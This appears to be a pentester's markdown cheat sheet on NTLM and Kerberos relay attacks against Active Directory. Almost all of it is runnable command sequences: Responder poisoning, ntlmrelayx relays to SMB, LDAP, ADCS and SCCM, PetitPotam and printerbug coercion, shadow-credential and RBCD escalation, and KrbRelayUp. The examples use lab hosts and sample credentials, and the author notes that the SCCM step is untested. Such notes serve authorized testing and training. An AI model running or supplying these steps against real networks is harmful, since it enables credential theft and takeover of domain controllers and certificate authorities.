---
title: Relay
tags:
  - activedirectory
  - relay
en: "true"
---
# NTLM Relay
_Note: This attack will only work if SMB signing if disabled. This can be verify with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or any similar tools_

### Basic Relaying
1. Disable **SMB** and **HTTP** in `/etc/Responder.conf`
2. Fire up responder. **SMB** and **HTTP** protocol now should now show as [OFF]

```bash
Responder.py -I eth0 -rdvw
```

3. Create a targets.txt file containing targeted ip addresses. `ntlmrelayx.py` will run captured hash to every protocol available on the given ip addresses

```
all://192.168.0.10
all://192.168.0.11
```

4. Run `ntlmrelayx.py`

```bash
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

5. Authenticate with any available Impacket scripts through `proxychains` and supply no password

```bash
# PsExec
proxychains Psexec.py contoso/administrator:''@192.168.0.10

# mssqlclient
proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
```

### Dump Domain Objects
lookupsid.py

### Store SOCKS Sessions
```bash
ntlmrelayx.py -t 192.168.86.182 -smb2support -socks

python3 PetitPotam.py 192.168.86.193 192.168.86.183
```

### Request User Certificate
```bash
# certipy
certipy relay -ca ca01.range.net -template 'DomainController'

# impacket
ntlmrelayx.py -t http://ca01.range.net/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'

# coerce with 
python3 PetitPotam.py 192.168.86.193 192.168.86.182
```

### Shadow Credentials

>[!note]
>The target ldap server cannot be a CA server (ADCS) or else the attack won't work.

```bash
# note that --remove-mic is only needed with NetNTLMv1. If not, you might want to use a WebDav coerce approach.
ntlmrelayx.py -t ldap://dc01.range.net -smb2support --remove-mic --shadow-credentials --shadow-target 'ca01$'

# coerce 
py PetitPotam.py 192.168.86.193 192.168.86.182

# use Pass-The-Certificate attack to authenticate
```

### ESC8
Refer [[ESC8]]

### Stealing SCCM NAA Credentials
This attack would require a coercion methods (PetitPotam, PrinterBug, etc.) in order to relay to an SCCM http endpoint (`http://SCCM01/ccm_system/request` ). However as far as this is updated (10/13/2022), PR hasn't been merged yet. Here is the PR [link](https://github.com/SecureAuthCorp/impacket/pull/1425)

```bash
ntlmrelayx.py -t http://SCCM01/ccm_system/request --sccm --sccm-device Relay-Device --sccm-fqdn
```

>[!warning]
>This haven't been tested yet

### Webdav to LDAP(S)

1. Enumerate the environment if any servers/workstations have a webdav service enabled

```bash
cme smb 192.168.86.0/24 -u rangeadm -p Password123 -M webdav
```

>[!info]
>In order to check if webdav service is running, you can verify if `DAV RPC SERVICE` named pipe exists. There are various ways and tools to achieve this. Here are some of the public tools available:
>- https://github.com/G0ldenGunSec/GetWebDAVStatus
>- https://github.com/Hackndo/WebclientServiceScanner

2. Setup a response (this step is required because we need our NETBIOS name in order for webdav to work). Disable(off) HTTP and SMB protocol in `/etc/response/Responder.conf` config file.

```bash
responder -I eth0
```

3. Setup ntlmrelayx.py targetting ldap(s) protocol

```bash
ntlmrelayx.py -t ldaps://dc01.range.net -smb2support -i
```

4. Use any of your coerce methods. In my case, i'll use printerbug.py. 

```bash
py printerbug.py -no-ping range.net/rangeadm:Password123@192.168.86.184 'WIN-6FQLURGYGLP@80/whatever'
```

5. A successful relay to ldap(s) protocol could be further escalated to [RBCD](#resource-based-constrained-delegation) or [Shadow Credentials](#shadow-credentials) attack. Below are the commands example.

```bash
# RBCD with ntlmrelayx.py
ntlmrelayx.py -t ldaps://dc01.range.net -smb2support --delegate-access

# Shadow Creds
ntlmrelayx.py -t ldaps://dc01.range.net -smb2support --shadow-credentials --shadow-target 'ca01$'
```

### NetNTLMv1 to LDAP(S)
```bash
ntlmrelayx.py -t ldaps://ca01.range.net -smb2support --remove-mic -i

python3 PetitPotam.py 192.168.86.193 192.168.86.182
```

### Relay Notes
![Relay Roadmap](relay_list.png)
* [KrbRelayUP](https://twitter.com/an0n_r0/status/1519344255143141376?s=20&t=nk-MeM42nRevaMPNOvQDoA)
* [RPC2RBCD](https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb)
* [lookupsid](https://twitter.com/an0n_r0/status/1506824658838040580?s=20&t=HJ9qD6GkzCvg1p24XZ6A2Q)
* [Kerberos Relay over DNS](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)
* [Flangvik's VOD RPC2RBCD](https://www.youtube.com/watch?v=axPkf_kLpMA)
* [NTLMv1 Downgrade](https://twitter.com/theluemmel/status/1454774400553787394?s=20&t=V55BIRuHPzUSLDOEdVCfEg)
* [NTLMv1 Downgrade Requirements](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ntlm/ntlmv1-downgrade)
* https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay
* https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
* [All Relay attacks covered by @vendetce (pdf)](https://www.blackhillsinfosec.com/wp-content/uploads/2022/09/Coercions-and-Relays-The-First-Cred-is-the-Deepest.pdf)
* [All Relay attacks covered by @vendetce (youtube)](https://www.youtube.com/watch?v=b0lLxLJKaRs)
* https://www.youtube.com/watch?v=b0lLxLJKaRs
* https://www.blackhillsinfosec.com/wp-content/uploads/2022/09/Coercions-and-Relays-The-First-Cred-is-the-Deepest.pdf

# Kerberos Relay
### KrbRelayUp
KrbRelayUp is a one off toll that automate all the kerberos relaying steps to coerce DCOM authentication from system user. This can be abused by doing [RBCD](#resource-based-constrained-delegation) or [Shadow Credentials](#shadow-credentials) attack. The tool can be found in the original repository [here](https://github.com/Dec0ne/KrbRelayUp)and a compiled version can be found in Flangvik's [SharpCollections](https://github.com/Flangvik/SharpCollection) repo.
```powershell
KrbRelayUp.exe full -m [rbcd|shadowcred] -f
```